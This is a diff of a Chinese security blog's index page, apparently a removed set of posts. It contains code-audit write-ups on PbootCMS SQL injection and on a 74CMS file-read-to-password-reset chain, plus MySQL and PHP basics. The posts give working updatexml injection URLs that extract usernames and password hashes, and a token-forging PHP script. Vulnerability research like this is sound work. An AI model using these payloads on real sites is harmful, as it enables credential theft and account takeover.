-POST: tel[id`) values (1 and updatexml(1,concat(0x7e,user()),1)); -- a]=12
-</code></pre><p><strong>漏洞利用：</strong><br>要完成漏洞利用,需要在数据库中添加一个字段使得<code>fcode</code>为2<br>我们在后台新增一个表单:<br><img src="http://static.zybuluo.com/chhyx/2wru3avgsj3u0ykcqhjknf83/image_1cpo24s2d92r1gfl11rpq1vkj9.png" alt="image_1cpo24s2d92r1gfl11rpq1vkj9.png-62.4kB"></p>
-<p>新增一个字段:<br><img src="http://static.zybuluo.com/chhyx/2dienx7ri5ej67imlqkos8s6/image_1cpo26dqd6r61d4l18vt1lj3190km.png" alt="image_1cpo26dqd6r61d4l18vt1lj3190km.png-66.3kB"><br><img src="http://static.zybuluo.com/chhyx/512i12ionncb6jg75lqax0b0/image_1cpo3bvr5f7j7cc2nd11vn1u92p.png" alt="image_1cpo3bvr5f7j7cc2nd11vn1u92p.png-226.7kB"></p>
-<p>数据库:<br><img src="http://static.zybuluo.com/chhyx/xwhvuc5mi1kmtkf75xw92quv/image_1cppm94mf134u1t061qtg1rpg9rm9.png" alt="image_1cppm94mf134u1t061qtg1rpg9rm9.png-283.3kB"></p>
-<p>注入:<br><img src="http://static.zybuluo.com/chhyx/397nmoityn6jgrqcufb2k6g2/image_1cpo3qdm010e7kr78vm1jl6e9o1j.png" alt="image_1cpo3qdm010e7kr78vm1jl6e9o1j.png-362.4kB"></p>
-<p>##<strong>3.主页处注入</strong><br><strong>代码分析:</strong><br>A.这里继续寻找在<code>home\Model</code>中寻找调用<code>where</code>操作的函数<br>找到2处<code>getList</code>与<code>getSpecifyList</code>,两处的利用点都在<code>where</code>操作里:</p>
-<pre><code>public function getList($scode, $num, $order, $filter = array(), $where = array(), $fuzzy = true)
-{
-    ...
-    return parent::table(&apos;ay_content a&apos;)-&gt;field($fields)
-        -&gt;where($where1, &apos;OR&apos;)
-        -&gt;where($where2)    //触发点
-        -&gt;where($where, &apos;AND&apos;, &apos;AND&apos;, $fuzzy)
-    ...
-}
-</code></pre><p>-</p>
-<pre><code>public function getSpecifyList($scode, $num, $order, $filter = array(), $where = array(), $fuzzy = true)
-{
-    ...
-    return parent::table(&apos;ay_content a&apos;)-&gt;field($fields)
-        -&gt;where($where1, &apos;OR&apos;)
-        -&gt;where($where2) //触发点
-        -&gt;where($where, &apos;AND&apos;, &apos;AND&apos;, $fuzzy)
-        ...
-}
-</code></pre><p>B.我们再搜索下<code>home\controller</code>中调用<code>getList()</code>或<code>getSpecifyList（）</code>函数的方法,在<code>ParserController.php</code>找到<code>parserSpecifyListLabel()</code>方法:</p>
-<pre><code>public function parserSpecifyListLabel($content)
-{
-    $pattern = &apos;/\{pboot:list(\s+[^}]+)?\}([\s\S]*?)\{\/pboot:list\}/&apos;;
-    $pattern2 = &apos;/\[list:([\w]+)(\s+[^]]+)?\]/&apos;;
-    if (preg_match_all($pattern, $content, $matches)) {
-        $count = count($matches[0]);
-        for ($i = 0; $i &lt; $count; $i ++) {
-            // 获取调节参数
-            $params = $this-&gt;parserParam($matches[1][$i]);
-            ...
-            // 数据筛选
-            $where2 = array();
-            foreach ($_GET as $key =&gt; $value) {//漏洞触发点
-                if (substr($key, 0, 4) == &apos;ext_&apos;) { // 其他字段不加入
-                    $where2[$key] = get($key); 
-                }
-            } 
-            ...
-            // 读取数据
-            //5 4   date DESC,sorting ASC,id DESC  array(0)
-            if ($page) {
-                $data = $this-&gt;model-&gt;getList($scode, $num, $order, $where1, $where2);
-            } else {
-                $data = $this-&gt;model-&gt;getSpecifyList($scode, $num, $order, $where1, $where2);
-            }
-</code></pre><p>C.阅读代码先判断GET传输过来的<code>key</code>值前4位是否为<code>ext_</code>(扩展字段),如果是的话,直接赋值给<code>$where2</code>,然后进入读取数据操作,调用<code>getList</code>或<code>getSpecifyLis</code><br>触发注入。</p>
-<p>D.我们追溯调用该<code>parserSpecifyListLabel()</code>函数的方法:<br> <code>parserSpecifyListLabel()---&gt;parserAfter()---&gt;index(IndexController.php)</code> 查看该index函数:</p>
-<pre><code>public function index()
-{
-    $content = parent::parser(&apos;index.html&apos;); // 框架标签解析
-    ...
-    $content = $this-&gt;parser-&gt;parserAfter($content); // CMS公共标签后置解析   跟进这个方法
-    $this-&gt;cache($content, true);
-}
-</code></pre><p>这里逻辑就很清楚了,利用系统解析list标签下的ext扩展字段来进行注入。<br>这里key值为任意扩展字段(<code>ext_price ext_type ext_color</code>)即可:<br><img src="http://static.zybuluo.com/chhyx/vi4grkematw263ehpl3t7cgx/image_1cpqr3p931934f811s0lfhspuk18.png" alt="image_1cpqr3p931934f811s0lfhspuk18.png-106.9kB"></p>
-<p>漏洞涉及文件:</p>
-<pre><code>IndexController.php的index()---&gt;parserAfter()---&gt;parserSpecifyListLabel()--&gt;getList()/getSpecifyList()---&gt;where() 
-</code></pre><p>直接拼接key造成注入</p>
-<p><strong>漏洞利用:</strong><br>因为系统会将空格转化为_ 我们可用/**/来绕过。</p>
-<pre><code>payload: http://127.0.0.1:89/index.php?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x23,password)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
-</code></pre><p>因为updatexml的最大长度为32位,所以在查询password时会显示不全,我们在实战过程中可以单独读取password字段或者利用其他函数注入即可。这个之后文章讨论。</p>
-<p>注入:<br><img src="http://static.zybuluo.com/chhyx/msmqe1h5bab7lemysg3zrb2l/image_1cpql0h0g1r4qia91d3l1oms6kq9.png" alt="image_1cpql0h0g1r4qia91d3l1oms6kq9.png-216.5kB"></p>
-<p>##<strong>4.搜索处注入</strong><br>代码分析:<br>A.我们继续搜索<code>home\controller</code>中调用<code>getList()</code>或<code>getSpecifyList（）</code>函数的方法,在<code>ParserController.php</code>找到<code>parserSearchLabel()</code>方法。</p>
-<pre><code>public function parserSearchLabel($content)
-{
-    $pattern = &apos;/\{pboot:search(\s+[^}]+)?\}([\s\S]*?)\{\/pboot:search\}/&apos;;
-    $pattern2 = &apos;/\[search:([\w]+)(\s+[^]]+)?\]/&apos;;
-    ...
-            // 存储搜索条件，条件为“并列”关系，由于为模糊匹配，条件为空时意味着“任意”
-            $where2 = array();
-    ...
-
-            // 数据接收
-            foreach ($_GET as $key =&gt; $value) {
-                if (! ! $value = get($key, &apos;vars&apos;)) {
-                    $where2[$key] = $value;//key 可控
-                }
-            }
-    ...
-            // 读取数据
-            if (! $data = $this-&gt;model-&gt;getList($scode, $num, $order, $where1, $where2, $fuzzy)) {
-            ...
-</code></pre><p>这里代码逻辑:将<code>GET</code>传输过来的字段直接赋值给<code>where2</code>数组 接着进入<code>getList()</code>方法 造成注入</p>
-<p>B.然后同上,搜索<code>home\controller</code>中调用<code>parserSearchLabel()</code>的方法,我们追溯调用该<code>parserSearchLabel()</code>函数的方法:<br> <code>parserSearchLabel()---&gt;index(SearchController.php)</code> 查看该index函数:</p>
-<pre><code>public function index()
-{
-    $content = parent::parser(&apos;search.html&apos;); // 框架标签解析
-    ...
-    $content = $this-&gt;parser-&gt;parserSearchLabel($content); // 搜索结果标签    跟进这个地方
-    ...
-}
-</code></pre><p>这里逻辑就很清楚了,利用系统解析<code>search</code>标签字段而对<code>get</code>传输进来的参数无有效过滤造成注入。</p>
-<p>C.涉及文件:</p>
-<pre><code>SearchController.php的index()---&gt;parserSearchLabel()--&gt;getList()/getSpecifyList()---&gt;where() 
-</code></pre><p><strong>漏洞利用:</strong></p>
-<pre><code>payload: http://127.0.0.1:89/index.php/search?updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x23,password)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
-</code></pre><p>注入:<br><img src="http://static.zybuluo.com/chhyx/lx86w77bhpkxenv0vipg9ry8/image_1cpqthi64jkb1iae1q8u1n5i1oc1l.png" alt="image_1cpqthi64jkb1iae1q8u1n5i1oc1l.png-144.6kB"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/12/mysql基础命令/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/12/mysql基础命令/" itemprop="url">mysql基础命令</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-12T09:15:41+08:00">
-                2018-10-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>mysql基础知识,持续更新。没事儿敲一敲命令。</p>
-</blockquote>
-<hr>
-<p>mysql基础命令:</p>
-<p>连接:<code>mysql -uroot -proot</code><br>不区分大小写<br>数据库操作:</p>
-<pre><code>create DATABASE RUNOOB;//创建
-drop database runoop;//删除
-use runoob;//进入runoob库
-</code></pre><p>数据表操作:<br>进入数据库后就可对表进操作:</p>
-<pre><code>创建数据表:
-mysql&gt; create table runoob_tbl(
-    -&gt; runoob_id int not null auto_increment,
-    -&gt; runoob_title varchar(50) not null,
-    -&gt; run_auther varchar(50) not null,
-    -&gt; primary key (runoob_id)
-    -&gt; );
-
-删除数据表:
-mysql&gt;DROP TABLE runoob_tbl
-</code></pre><p>数据字段操作:</p>
-<pre><code>插入数据  //注意字段内容加引号
-mysql&gt; insert into runoob_tbl
--&gt; (runoob_id,runoob_title,run_auther)
--&gt; values
--&gt; (&apos;1&apos;,&apos;test_title&apos;,&apos;P0rZ9&apos;);
-
-查询数据
-mysql-&gt;select * from runoob_tbl;
-
-删除数据
-DELETE FROM runoob_tbl WHERE runoob_id=3;
-</code></pre><hr>
-<p>union操作符可以合并两条select语句的查询结果,基本语法:</p>
-<pre><code>select * from table union select * from user;
-</code></pre><p>union使用满足条件:<br>两个查询返回的列数必须相同<br>两个查询语句返回数据类型必须相同</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/12/PHP基础知识/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/12/PHP基础知识/" itemprop="url">基础知识 | PHP基础知识</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-12T08:15:41+08:00">
-                2018-10-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>打算将PHP学习的基础知识码出来,持续更新。</p>
-</blockquote>
-<hr>
-<p>php四种标记风格：</p>
-<pre><code>&lt;?php ?&gt; //官方推荐
-&lt;? ?&gt;    //短标记风格 需要在php.ini中设置short_open_tag = on
-&lt;% %&gt;    //ASP风格    需要在php.ini中设置asp_tags = on
-&lt;script language=&quot;php&quot;&gt;代码&lt;/script&gt; //JS标记风格 任意情况都可使用
-</code></pre><p>注释:</p>
-<pre><code>// #        //单行注释
-/*   */     //多行注释
-</code></pre><p>引用赋值：<br><img src="http://static.zybuluo.com/chhyx/nvnvjmhlnfqbjyu8l5lp9pfs/image_1cpj4q7d57ph1jm11qvfeg1sqm1m.png" alt="image_1cpj4q7d57ph1jm11qvfeg1sqm1m.png-39.8kB"><br><img src="http://static.zybuluo.com/chhyx/q58f8ggkquq7i5xocprc2pg9/image_1cpj4nuff1uh41jrh14uc1i9711uop.png" alt="image_1cpj4nuff1uh41jrh14uc1i9711uop.png-47kB"></p>
-<p>字符串:<br>单引号:变量和转义的序列都不会进行转义<br>双引号:PHP会处理双引号括起来的字符串、变量以及转义序列(\n等)</p>
-<p>标识符(定界符)：<br><img src="http://static.zybuluo.com/chhyx/vkgni63ayh1e2xowi3cnum1z/image_1cpj5rk701vlv1ge1d0q106m4c023.png" alt="image_1cpj5rk701vlv1ge1d0q106m4c023.png-37.1kB"></p>
-<p>格式化字符串:<br><img src="http://static.zybuluo.com/chhyx/aourri8psost2uos8z6jqft4/image_1cpj65kpp138a1h1819jb1ufguam2g.png" alt="image_1cpj65kpp138a1h1819jb1ufguam2g.png-32.8kB"></p>
-<p>获取字串位置:</p>
-<pre><code>&lt;?php
-
-$str = &apos;Php is the best,php is my favorite&apos;;
-</code></pre><p>echo substr_count($str,’php’);//出现次数<br>    echo strpos($str,’php’);//返回php第一次出现在$str的位置<br>    echo stripos($str,’php’);//返回php第一次出现在$str的位置 不区分大小写<br>    echo strrpos($str,’php’);//返回php最后一次出现在$str的位置<br>    echo strripos($str,’php’);//返回php最后一次出现在$str的位置 不区分大小写</p>
-<pre><code>?&gt;
-</code></pre><p>字符串替换：<br><img src="http://static.zybuluo.com/chhyx/1w096o9pm7ym6uqyq7qs8yim/image_1cpj76eft8dh1ac5vd5qb12mf2t.png" alt="image_1cpj76eft8dh1ac5vd5qb12mf2t.png-34.9kB"></p>
-<p>正则:</p>
-<pre><code>a.^PHP 匹配以PHP开头的字符串
-  [^a-z] 表示匹配所有非小写字母开头的字符串
-b.PHP$ 匹配以PHP结尾的字符串
-</code></pre><p>c.^PHP$ 精确匹配PHP字符串<br>    d.PHP 匹配所有含有PHP的字符串<br>    e.com|org|net 匹配com、org、net中的任意一个<br>    f.PHP内置通用字符集</p>
-<p><img src="http://static.zybuluo.com/chhyx/gn2bptw7jyzjckdyzluyycnf/image_1cpj7d42p1hji1sahkukfrrhio3q.png" alt="image_1cpj7d42p1hji1sahkukfrrhio3q.png-34.5kB"></p>
-<pre><code>g.使用{}确定重复出现的次数
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/26tsa0smndv6beslkafazqif/image_1cpj7fkmk5fei11gvn1flv1b399.png" alt="image_1cpj7fkmk5fei11gvn1flv1b399.png-35.5kB"></p>
-<p>文件操作:<br>a.目录部分</p>
-<pre><code>$path = &quot;c:/sec/blogs/index/&quot;;
-$file = dirname($path); //返回目录 $file:c:/sec/blogs
-</code></pre><p>b.路径关联数组:</p>
-<pre><code>$pathinfo = pathinfo(&quot;www/test/index.html&quot;);
-//得到一个数组 包含4个值
-echo $pathinfo[&apos;dirname&apos;];//路径 www/test
-echo $pathinfo[&apos;basename&apos;];//基本名 index.html
-echo $pathinfo[&apos;extension&apos;];//扩展名 html
-echo $pathinfo[&apos;filename&apos;];//文件名 index
-</code></pre><p>c.文件部分<br>file<br>open<br>copy<br>file_get_contents</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/" itemprop="url">代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-10T09:15:41+08:00">
-                2018-10-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<p>审计cms：<a href="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:任意文件读取得到关键Token来修改用户密码。<br>任意文件读取漏洞可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/09/74CMS_V4.2.111%E4%B8%80%E5%A4%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E9%99%84py%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">74CMS_V4.2.111一处任意文件读取附py脚本</a></p>
-<p><strong>代码分析</strong><br>1.在查看<code>Home\Controller\ApiController.class.php</code>代码时:<br>发现编辑会员资料时可用<code>uid</code>修改密码<br><img src="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" alt="image_1cpe26mdq14po5331v8a1gik1132d.png-60.4kB"></p>
-<p>遂拿起Burp测试一波:<br><img src="http://static.zybuluo.com/chhyx/gdusp76823b283ot2p7my7ou/image_1cpdu0m528571igq1v16eirejpp.png" alt="image_1cpdu0m528571igq1v16eirejpp.png-84.1kB"></p>
-<p>发现显示Token验证失败 我们跟进验证token的函数<code>check_token()</code>:<br><img src="http://static.zybuluo.com/chhyx/e0p6ctn3i3xh1smil7qikr9d/image_1cpduafgk1ps31irv1c5h12g9f7716.png" alt="image_1cpduafgk1ps31irv1c5h12g9f7716.png-57.2kB"></p>
-<p>我们要想通过<code>token</code>验证 需要满足这个条件:</p>
-<pre><code>(decrypt($token,C(&apos;PWDHASH&apos;))==C(&apos;PWDHASH&apos;))
-</code></pre><p>2.跟进<code>decrypt()</code>,发现这是一个解密函数,参数为源字符串与密钥:</p>
-<pre><code>function decrypt($txt, $key = &apos;_qscms&apos;) {//token  C
-// $txt 的结果为加密后的字串经过 base64 解码，然后与私有密匙一起，
-// 经过 passport_key() 函数处理后的返回值
-$txt = passport_key(base64_decode($txt), $key);
-// 变量初始化
-$tmp = &apos;&apos;;
-// for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数
-for ($i = 0; $i &lt; strlen($txt); $i++) {
-    // $tmp 字串在末尾增加一位，其内容为 $txt 的第 $i 位，
-    // 与 $txt 的第 $i + 1 位取异或。然后 $i = $i + 1
-    $tmp .= $txt[$i] ^ $txt[++$i];
-}
-// 返回 $tmp 的值作为结果
-return $tmp;
-</code></pre><p>}</p>
-<p>分析代码可得到正确的token值为<code>C(&#39;PWDHASH&#39;)</code>与密钥<code>C(&#39;PWDHASH&#39;)</code>经过<code>encrypt()</code>加密得到的字符串。</p>
-<p>我们先测试下如果拿到正确Token可不可以成功修改密码:<br><img src="http://static.zybuluo.com/chhyx/s0rm02likekl3984br8648j0/image_1cpe4ogft18r2iof1jeidqf1n7v2m.png" alt="image_1cpe4ogft18r2iof1jeidqf1n7v2m.png-89.3kB"></p>
-<p>去Burp测试:<br><img src="http://static.zybuluo.com/chhyx/a2od1lkyzvmohwm4qgqttoi3/image_1cpe4t1s01ce91irna0brlj1l2r33.png" alt="image_1cpe4t1s01ce91irna0brlj1l2r33.png-97.4kB"></p>
-<p>可看到修改成功。</p>
-<p>3.那现在的问题转化为如何去获取密钥<code>C(&#39;PWDHASH&#39;)</code><br>因为这个值是系统定义好的,那我们就可以利用昨天审出的文件读取来得到密钥,我们搜索下定义密钥的文件,得到<code>pwdhash.php</code>。</p>
-<p>4.现在利用漏洞就很简单了</p>
-<pre><code>python脚本获取含有密钥的jpg文件--&gt;PHP利用密钥进行加密,得到token--&gt;用得到的token修改用户密码
-</code></pre><p><strong>漏洞利用</strong><br>1.通过任意文件读取<br><code>upload\Application\Common\Conf\pwdhash.php</code>文件,得到一个包含pwdhash值的jpg文件</p>
-<p><img src="http://static.zybuluo.com/chhyx/e1c4hizaw7ro9iph3nht1cof/image_1cpe3saa8fdl6tkc2idmr10b529.png" alt="image_1cpe3saa8fdl6tkc2idmr10b529.png-76.1kB"></p>
-<p>2.我们本地加密得到<code>token</code>:</p>
-<pre><code>#demo.php
-&lt;?php
-
-function get_token($pwdhash){
-    $token = encrypt($pwdhash,$pwdhash);
-    var_dump($token);
-
-}
-function encrypt($txt, $key = &apos;_qscms&apos;) {
-    ...
-}
-function passport_key($txt, $encrypt_key) {
-   ...
-}
-
-$file_name = &apos;http://127.0.0.1:84/data/upload/avatar/1810/10/76162f0285d10193b1d79ceff9653d1c.jpg&apos;;
-$data = eval(str_replace(&apos;&lt;?php&apos;, &apos;&apos;, file_get_contents($file_name)));
-get_token($data[&apos;PWDHASH&apos;]);
-?&gt;
-</code></pre><p>得到Token<br><img src="http://static.zybuluo.com/chhyx/zko0432p3ubba1cbxq8e3l9z/image_1cpe1iard1uic199ju9kueb1u4h1j.png" alt="image_1cpe1iard1uic199ju9kueb1u4h1j.png-111.9kB"></p>
-<p>3.用得到的token修改密码:<br><img src="http://static.zybuluo.com/chhyx/quwblkxx885w7i2eylbn5g12/image_1cpe1lksk20k5mfq9b1u5vvre20.png" alt="image_1cpe1lksk20k5mfq9b1u5vvre20.png-103.6kB"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2511,7 +2574,7 @@ get_token($data[&apos;PWDHASH&apos;]);
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-count">57</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2524,7 +2587,7 @@ get_token($data[&apos;PWDHASH&apos;]);
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
